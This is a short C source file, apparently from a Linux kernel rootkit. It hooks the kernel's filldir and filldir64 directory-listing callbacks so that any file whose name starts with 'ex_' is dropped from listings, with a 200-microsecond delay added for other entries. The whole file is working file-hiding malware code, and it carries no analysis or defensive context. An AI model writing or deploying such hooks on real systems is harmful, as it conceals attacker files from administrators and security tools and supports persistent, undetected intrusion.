/*
    Пока только по подстроке тут
*/
#include "files.h"


bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (strncmp(name, "ex_", strlen("ex_")) == 0) {
        pr_info("%s\n", name);
        return true;
    }
    
    bool ret = real_filldir64(ctx, name, namlen, offset, ino, d_type);
    udelay(200);
    return ret;
}

bool ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (strncmp(name, "ex_", strlen("ex_")) == 0) {
        pr_info("%s\n", name);
        return true;
    }
    
    bool ret = real_filldir(ctx, name, namlen, offset, ino, d_type);
    udelay(200);
    return ret;
}